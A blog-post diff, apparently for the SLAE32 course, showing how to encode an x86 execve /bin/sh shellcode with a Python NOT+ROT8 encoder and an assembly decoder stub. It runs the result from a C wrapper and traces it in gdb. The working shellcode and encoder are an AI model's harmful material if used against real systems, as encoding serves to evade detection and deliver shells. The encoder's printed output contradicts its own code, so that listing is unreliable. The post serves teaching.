@@ -1,0 +1,556 @@
+---
+layout: post
+title:  "SLAE32 - Custom shellcode Encoder"
+date:   2019-11-22 21:03:36 +0530
+categories: x86 ASM ENCODER SHELLCODE
+---
+
+In this blog post we going to talking about a custom shellcode encoder (NOT ROT encoder very basic), decoder stub and how we can use both things in an assembly program in order to deliver an executable shellcode.
+
+## Custom Shellcode encoder
+
+
+In this example, the exploit decode the payload (execve) on the fly using a decoder stub. Once executed, the decoder decodes the payload and jumps to it using a short jump instruction. 
+
+We going to use the execve shellcode. Here is the assembly code of the shellcode:
+
+
+## execve shellcode
+
+```
+global _start
+
+section .text
+
+_start:
+
+        xor eax, eax
+        push eax
+
+        ; PUSH //bin/sh (8 bytes) 
+
+        push 0x68732f2f
+        push 0x6e69622f
+        mov ebx, esp
+
+        push eax
+        mov edx, esp
+
+        push ebx
+        mov ecx, esp
+
+        mov al, 11
+        int 0x80
+```
+In order to extract the shellcode we need to assemble and link the program, we do this using the nasm and ld command:
+
+```
+motu@motu-pc:~/ASM/Assignment-4$ nasm -f elf32 execve.nasm -o execve.o
+motu@motu-pc:~/ASM/Assignment-4$ ld execve.o -o execve
+```
+
+We check for NULL characters to avoid future problems while using the shellcode:
+
+```
+motu@motu-pc:~/ASM/Assignment-4$ objdump -d execve -M intel
+
+execve:     file format elf32-i386
+
+Disassembly of section .text:
+
+08049000 <_start>:
+ 8049000:       31 c0                   xor    eax,eax
+ 8049002:       50                      push   eax
+ 8049003:       68 2f 2f 73 68          push   0x68732f2f
+ 8049008:       68 2f 62 69 6e          push   0x6e69622f
+ 804900d:       89 e3                   mov    ebx,esp
+ 804900f:       50                      push   eax
+ 8049010:       89 e2                   mov    edx,esp
+ 8049012:       53                      push   ebx
+ 8049013:       89 e1                   mov    ecx,esp
+ 8049015:       b0 0b                   mov    al,0xb
+ 8049017:       cd 80                   int    0x80
+```
+
+
+#### Dumping shellcode
+
+Using the command `objdump` we can extract the shellcode from the binary file.
+
+`objdump -d ./execve|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+`
+
+#### Final Execve shellcode
+
+```
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
+```
+
+## NOT|ROT Python Encoder
+
+We implement an encoder in python, this encoder takes each byte from the shellcode (execve) and perform a NOT + ROT 8 operation.
+
+```python
+#!/usr/bin/python
+
+shellcode = 
+              "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
+              "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
+              "\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" 
+
+encoded = ""
+encoded2 = ""
+
+rot = 8
+
+print 'Encoded shellcode ...'
+
+for x in bytearray(shellcode) :
+        # NOT encoding 
+        y = ~x
+        
+        # ROT 8 encoding
+        h  = (y + rot)%256
+
+        encoded += '\\x'
+        encoded += '%02x' % (h & 0xff)
+
+        encoded2 += '0x'
+        encoded2 += '%02x,' %(h & 0xff)
+
+
+print encoded
+
+print encoded2
+
+print 'Len: %d' % len(bytearray(shellcode))
+
+
+```
+We execute the python script to encode the execve shellcode.
+
+
+```
+motu@motu-pc:~/ASM/Assignment-4$ python Encoder.py 
+
+Encoded shellcode ...
+\x39\xc8\x58\x70\x37\x37\x7b\x70\x70\x37\x6a\x71\x76\x91\xeb\x58\x91\xea\x5b\x91\xe9\xb8\x13\xd5\x88
+0x39,0xc8,0x58,0x70,0x37,0x37,0x7b,0x70,0x70,0x37,0x6a,0x71,0x76,0x91,0xeb,0x58,0x91,0xea,0x5b,0x91,0xe9,
+0xb8,0x13,0xd5,0x88,
+Len: 25
+
+```
+
+### Assembly decoder
+
+#### NOT|ROT+8 decoder in assembly
+
+We need a decoder stub to decode each byte of the encoded shellcode. We create a simple an assembly program which use the sub and not operation to decode the shellcode.
+
+```
+
+global _start
+
+section .text
+_start:
+        jmp short call_shellcode
+
+decoder:
+        pop esi                 <---- esi contains a pointer to EncodedShellcode after pop operation
+        xor ecx, ecx
+        mov cl, 25              <--- Len of the shellcode
+
+decode:
+
+        sub byte [esi], 8       <--- ROT 8 (rotate 8 bytes)
+        not byte [esi]          <--- NOT a byte from ESI
+        inc esi
+        loop decode             <-- loop into the decode function until cl contains zero
+
+        jmp short EncodedShellcode
+
+call_shellcode:
+
+        call decoder
+
+        EncodedShellcode: db 0xd6,0x47,0xb7,0x9f,0xd8,0xd8,0x94,0x9f,0x9f,0xd8,0xa5,0x9e,0x99,0x7e,0x24,0xb7,0x7e,0x25,0xb4,0x7e,0x26,0x57,0xfc,0x3a,0x87  <-- Encoded execve shellcode
+
+
+```
+Compile and link the program. We use objdump to check null characters
+
+```
+motu@motu-pc:~/ASM/Assignment-4$ nasm -f elf32 not-rot-encoder.nasm -o not-rot-encoder.o
+motu@motu-pc:~/ASM/Assignment-4$ ld not-rot-encoder.o -o not-rot-encoder
+motu@motu-pc:~/ASM/Assignment-4$ objdump -d not-rot-encoder -M intel 
+
+not-rot-encoder:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08049000 <_start>:
+ 8049000:       eb 0f                   jmp    8049011 <call_shellcode>
+
+08049002 <decoder>:
+ 8049002:       5e                      pop    esi
+ 8049003:       31 c9                   xor    ecx,ecx
+ 8049005:       b1 19                   mov    cl,0x19
+
+08049007 <decode>:
+ 8049007:       80 2e 08                sub    BYTE PTR [esi],0x8
+ 804900a:       f6 16                   not    BYTE PTR [esi]
+ 804900c:       46                      inc    esi
+ 804900d:       e2 f8                   loop   8049007 <decode>
+ 804900f:       eb 05                   jmp    8049016 <EncodedShellcode>
+
+08049011 <call_shellcode>:
+ 8049011:       e8 ec ff ff ff          call   8049002 <decoder>
+
+08049016 <EncodedShellcode>:
+ 8049016:       d6                      (bad)                   <---- Encoded shellcode
+ 8049017:       47                      inc    edi
+ 8049018:       b7 9f                   mov    bh,0x9f
+ 804901a:       d8 d8                   fcomp  st(0)
+ 804901c:       94                      xchg   esp,eax
+ 804901d:       9f                      lahf   
+ 804901e:       9f                      lahf   
+ 804901f:       d8 a5 9e 99 7e 24       fsub   DWORD PTR [ebp+0x247e999e]
+ 8049025:       b7 7e                   mov    bh,0x7e
+ 8049027:       25 b4 7e 26 57          and    eax,0x57267eb4
+ 804902c:       fc                      cld    
+ 804902d:       3a                      .byte 0x3a
+ 804902e:       87                      .byte 0x87
+
+
+```
+
+Extract our shellcode using objdump.
+
+```
+motu@motu-pc:~/ASM/Assignment-4$ objdump -d ./not-rot-encoder|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+
+"\xeb\x0f\x5e\x31\xc9\xb1\x19\x80\x2e\x08\xf6\x16\x46\xe2\xf8\xeb\x05\xe8\xec\xff\xff\xff\xd6\x47\xb7\x9f\xd8\xd8\x94\x9f\x9f\xd8\xa5\x9e\x99\x7e\x24\xb7\x7e\x25\xb4\x7e\x26\x57\xfc\x3a\x87"
+
+```
+
+Put the shellcode in our C wrapper program
+
+```
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+
+"\xeb\x0f\x5e\x31\xc9\xb1\x19\x80\x2e\x08\xf6\x16\x46\xe2"
+"\xf8\xeb\x05\xe8\xec\xff\xff\xff\xd6\x47\xb7\x9f\xd8\xd8"
+"\x94\x9f\x9f\xd8\xa5\x9e\x99\x7e\x24\xb7\x7e\x25\xb4\x7e"
+"\x26\x57\xfc\x3a\x87";
+
+
+
+int main()
+{
+
+        printf("Shellcode Length:  %d\n", strlen(code));
+        int (*ret)() = (int(*)())code;
+        ret();                                                  <-- transfer control to the shellcode
+
+}
+```
+Now we compile the program using gcc and execute:
+
+```
+motu@motu-pc:~/ASM/Assignment-4$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+motu@motu-pc:~/ASM/Assignment-4$ ./shellcode 
+Shellcode Length:  47
+
+$ whoami 
+motu
+$ id
+uid=1000(motu) gid=1001(motu) groups=1001(motu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),117(lpadmin),1000(sambashare)
+$ 
+```
+
+### Analysis 
+
+In order to undestand how it works we set a breakpoint in the `main` function and run the program.
+```
+motu@motu-pc:~/ASM/Assignment-4$ gdb -q ./shellcode 
+Reading symbols from ./shellcode...(no debugging symbols found)...done.
+gdb-peda$ info functions 
+All defined functions:
+
+Non-debugging symbols:
+0x00001000  _init
+0x00001030  printf@plt
+0x00001040  strlen@plt
+0x00001050  __libc_start_main@plt
+0x00001060  __cxa_finalize@plt
+0x00001070  _start
+0x000010b0  __x86.get_pc_thunk.bx
+0x000010c0  deregister_tm_clones
+0x00001100  register_tm_clones
+0x00001150  __do_global_dtors_aux
+0x000011a0  frame_dummy
+0x000011a5  __x86.get_pc_thunk.dx
+0x000011a9  main
+0x00001210  __libc_csu_init
+0x00001270  __libc_csu_fini
+0x00001274  _fini
+gdb-peda$ break *main
+Breakpoint 1 at 0x11a9
+gdb-peda$ 
+
+```
+
+When the program hit the breakpoint we go through until we find the `call eax`  instruction. This instruction is used by the program to "transfer"  the control to the shellcode.
+
+```
+[----------------------------------registers-----------------------------------]
+EAX: 0x404020 --> 0x315e0feb 
+EBX: 0x403fd4 --> 0x3edc 
+ECX: 0x0 
+EDX: 0xb7fb2890 --> 0x0 
+ESI: 0xb7fb1000 --> 0x1dcd6c 
+EDI: 0xb7fb1000 --> 0x1dcd6c 
+EBP: 0xbffff038 --> 0x0 
+ESP: 0xbffff020 --> 0x1 
+EIP: 0x4011f7 (<main+78>:       call   eax)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x4011eb <main+66>:  lea    eax,[ebx+0x4c]
+   0x4011f1 <main+72>:  mov    DWORD PTR [ebp-0xc],eax
+   0x4011f4 <main+75>:  mov    eax,DWORD PTR [ebp-0xc]
+=> 0x4011f7 <main+78>:  call   eax                              <--- eax contains the pointer of our shellcode
+   0x4011f9 <main+80>:  mov    eax,0x0
+   0x4011fe <main+85>:  lea    esp,[ebp-0x8]
+   0x401201 <main+88>:  pop    ecx
+   0x401202 <main+89>:  pop    ebx
+No argument
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff020 --> 0x1 
+0004| 0xbffff024 --> 0xbffff0e4 --> 0xbffff2bb ("/home/motu/ASM/Assignment-4/shellcode")
+0008| 0xbffff028 --> 0xbffff0ec --> 0xbffff2e4 ("LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...)
+0012| 0xbffff02c --> 0x404020 --> 0x315e0feb 
+0016| 0xbffff030 --> 0xbffff050 --> 0x1 
+0020| 0xbffff034 --> 0x0 
+0024| 0xbffff038 --> 0x0 
+0028| 0xbffff03c --> 0xb7deeb41 (<__libc_start_main+241>:       add    esp,0x10)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x004011f7 in main ()
+gdb-peda$ 
+```
+
+Using the si (step into) we can deep into the program and see the decoder stub in action used to decode the execve payload.
+
+```
+[----------------------------------registers-----------------------------------]
+EAX: 0x404020 --> 0x315e0feb 
+EBX: 0x403fd4 --> 0x3edc 
+ECX: 0x0 
+EDX: 0xb7fb2890 --> 0x0 
+ESI: 0xb7fb1000 --> 0x1dcd6c 
+EDI: 0xb7fb1000 --> 0x1dcd6c 
+EBP: 0xbffff038 --> 0x0 
+ESP: 0xbffff01c --> 0x4011f9 (<main+80>:        mov    eax,0x0)
+EIP: 0x404020 --> 0x315e0feb
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x40401a:    add    BYTE PTR [eax],al
+   0x40401c:    add    BYTE PTR [eax],al
+   0x40401e:    add    BYTE PTR [eax],al
+=> 0x404020 <code>:     jmp    0x404031 <code+17>               <-- not-rot-encoder  
+ | 0x404022 <code+2>:   pop    esi
+ | 0x404023 <code+3>:   xor    ecx,ecx
+ | 0x404025 <code+5>:   mov    cl,0x19
+ | 0x404027 <code+7>:   sub    BYTE PTR [esi],0x8
+ |->   0x404031 <code+17>:      call   0x404022 <code+2>
+       0x404036 <code+22>:      (bad)
+       0x404037 <code+23>:      inc    edi
+       0x404038 <code+24>:      mov    bh,0x9f
+                                                                  JUMP is taken
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff01c --> 0x4011f9 (<main+80>:       mov    eax,0x0)
+0004| 0xbffff020 --> 0x1 
+0008| 0xbffff024 --> 0xbffff0e4 --> 0xbffff2bb ("/home/motu/ASM/Assignment-4/shellcode")
+0012| 0xbffff028 --> 0xbffff0ec --> 0xbffff2e4 ("LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...)
+0016| 0xbffff02c --> 0x404020 --> 0x315e0feb 
+0020| 0xbffff030 --> 0xbffff050 --> 0x1 
+0024| 0xbffff034 --> 0x0 
+0028| 0xbffff038 --> 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x00404020 in code ()
+gdb-peda$ 
+```
+
+With the jmp-call-pop technique we save the pointer of the encoded shellcode into the esi register. 
+
+```
+[----------------------------------registers-----------------------------------]
+EAX: 0x404020 --> 0x315e0feb 
+EBX: 0x403fd4 --> 0x3edc 
+ECX: 0x0 
+EDX: 0xb7fb2890 --> 0x0 
+ESI: 0x404036 --> 0x9fb747d6     <-- ESI contains the pointer of encoded shellcode
+EDI: 0xb7fb1000 --> 0x1dcd6c 
+EBP: 0xbffff038 --> 0x0 
+ESP: 0xbffff01c --> 0x4011f9 (<main+80>:        mov    eax,0x0)
+EIP: 0x404023 --> 0x19b1c931
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x40401e:    add    BYTE PTR [eax],al
+   0x404020 <code>:     jmp    0x404031 <code+17>
+   0x404022 <code+2>:   pop    esi                          
+=> 0x404023 <code+3>:   xor    ecx,ecx
+   0x404025 <code+5>:   mov    cl,0x19
+   0x404027 <code+7>:   sub    BYTE PTR [esi],0x8
+   0x40402a <code+10>:  not    BYTE PTR [esi]
+   0x40402c <code+12>:  inc    esi
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff01c --> 0x4011f9 (<main+80>:       mov    eax,0x0)
+0004| 0xbffff020 --> 0x1 
+0008| 0xbffff024 --> 0xbffff0e4 --> 0xbffff2bb ("/home/motu/ASM/Assignment-4/shellcode")
+0012| 0xbffff028 --> 0xbffff0ec --> 0xbffff2e4 ("LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...)
+0016| 0xbffff02c --> 0x404020 --> 0x315e0feb 
+0020| 0xbffff030 --> 0xbffff050 --> 0x1 
+0024| 0xbffff034 --> 0x0 
+0028| 0xbffff038 --> 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x00404023 in code ()
+gdb-peda$ 
+```
+
+Now with the esi register containing the pointer of the shellcode, we can start the decoding process. The first step is substract 0x8 (remember rot 8) from the esi. The value of esi before sub operation is 0x9fb747d6
+
+```
+[----------------------------------registers-----------------------------------]
+EAX: 0x404020 --> 0x315e0feb 
+EBX: 0x403fd4 --> 0x3edc 
+ECX: 0x19 
+EDX: 0xb7fb2890 --> 0x0 
+ESI: 0x404036 --> 0x9fb747d6            <- Current value before sub operation
+EDI: 0xb7fb1000 --> 0x1dcd6c 
+EBP: 0xbffff038 --> 0x0 
+ESP: 0xbffff01c --> 0x4011f9 (<main+80>:        mov    eax,0x0)
+EIP: 0x404027 --> 0xf6082e80
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x404021 <code+1>:   divps  xmm6,XMMWORD PTR [ecx]
+   0x404024 <code+4>:   leave  
+   0x404025 <code+5>:   mov    cl,0x19
+=> 0x404027 <code+7>:   sub    BYTE PTR [esi],0x8       <- substract from esi 0x8 byte
+   0x40402a <code+10>:  not    BYTE PTR [esi]
+   0x40402c <code+12>:  inc    esi
+   0x40402d <code+13>:  loop   0x404027 <code+7>
+   0x40402f <code+15>:  jmp    0x404036 <code+22>
+```
+
+After subustraction, the value of esi is 0x9fb747ce. Now we use the not instruction into the current byte of the esi to obtain the decoded value.
+
+
+```
+[----------------------------------registers-----------------------------------]
+EAX: 0x404020 --> 0x315e0feb 
+EBX: 0x403fd4 --> 0x3edc 
+ECX: 0x19 
+EDX: 0xb7fb2890 --> 0x0 
+ESI: 0x404036 --> 0x9fb747ce                    <- esi after sub operation        
+EDI: 0xb7fb1000 --> 0x1dcd6c 
+EBP: 0xbffff038 --> 0x0 
+ESP: 0xbffff01c --> 0x4011f9 (<main+80>:        mov    eax,0x0)
+EIP: 0x40402a --> 0xe24616f6
+EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x404024 <code+4>:   leave  
+   0x404025 <code+5>:   mov    cl,0x19
+   0x404027 <code+7>:   sub    BYTE PTR [esi],0x8
+=> 0x40402a <code+10>:  not    BYTE PTR [esi]       <- NOT opeation here 
+   0x40402c <code+12>:  inc    esi
+   0x40402d <code+13>:  loop   0x404027 <code+7>
+   0x40402f <code+15>:  jmp    0x404036 <code+22>
+   0x404031 <code+17>:  call   0x404022 <code+2>
+```
+
+After the not & rot operation the value of esi is 0x9fb74731. Because we modified a byte in the esi register the new value after decoding process is 0x31. Using the x command (examine memory command) we can see this value
+
+```
+gdb-peda$ x/4bx $esi 
+0x404036 <code+22>:     0x31    0x47    0xb7    0x9f   <- 0x31 is the decoded value of the execve payload
+gdb-peda$ 
+
+```
+Now with the `inc esi` instruction we increment the esi register to decode the next byte.
+
+```
+[----------------------------------registers-----------------------------------]
+EAX: 0x404020 --> 0x315e0feb 
+EBX: 0x403fd4 --> 0x3edc 
+ECX: 0x19 
+EDX: 0xb7fb2890 --> 0x0 
+ESI: 0x404036 --> 0x9fb74731 
+EDI: 0xb7fb1000 --> 0x1dcd6c 
+EBP: 0xbffff038 --> 0x0 
+ESP: 0xbffff01c --> 0x4011f9 (<main+80>:        mov    eax,0x0)
+EIP: 0x40402c --> 0xebf8e246
+EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x404025 <code+5>:   mov    cl,0x19
+   0x404027 <code+7>:   sub    BYTE PTR [esi],0x8
+   0x40402a <code+10>:  not    BYTE PTR [esi]
+=> 0x40402c <code+12>:  inc    esi
+   0x40402d <code+13>:  loop   0x404027 <code+7>
+   0x40402f <code+15>:  jmp    0x404036 <code+22>
+   0x404031 <code+17>:  call   0x404022 <code+2>
+   0x404036 <code+22>:  xor    DWORD PTR [edi-0x49],eax
+```
+
+Using the the loop instruction we can iterate into each value of the EncodedShellcode until is decoded.
+
+When the ecx register contains the zero the loops end and the jmp instruction is taken to transfer the control to the execve payload.
+
+```
+[----------------------------------registers-----------------------------------]
+EAX: 0x404020 --> 0x315e0feb 
+EBX: 0x403fd4 --> 0x3edc 
+ECX: 0x0 
+EDX: 0xb7fb2890 --> 0x0 
+ESI: 0x40404f --> 0x0 
+EDI: 0xb7fb1000 --> 0x1dcd6c 
+EBP: 0xbffff038 --> 0x0 
+ESP: 0xbffff01c --> 0x4011f9 (<main+80>:        mov    eax,0x0)
+EIP: 0x40402f --> 0xece805eb
+EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x40402a <code+10>:  not    BYTE PTR [esi]
+   0x40402c <code+12>:  inc    esi
+   0x40402d <code+13>:  loop   0x404027 <code+7>
+=> 0x40402f <code+15>:  jmp    0x404036 <code+22>
+ | 0x404031 <code+17>:  call   0x404022 <code+2>
+ | 0x404036 <code+22>:  xor    eax,eax
+ | 0x404038 <code+24>:  push   eax
+ | 0x404039 <code+25>:  push   0x68732f2f
+ |->   0x404036 <code+22>:      xor    eax,eax
+       0x404038 <code+24>:      push   eax
+       0x404039 <code+25>:      push   0x68732f2f
+       0x40403e <code+30>:      push   0x6e69622f
+                                                                  JUMP is taken
+```
+
+After we press the c (continue) command we can see the program end successfuly executing the shell.
+
+```
+gdb-peda$ c
+Continuing.
+process 7243 is executing new program: /bin/dash
+
+[1]+  Stopped                 gdb -q ./shellcode
+motu@motu-pc:~/ASM/Assignment-4$ 
+```
+Awesome !!!
+
+***
+
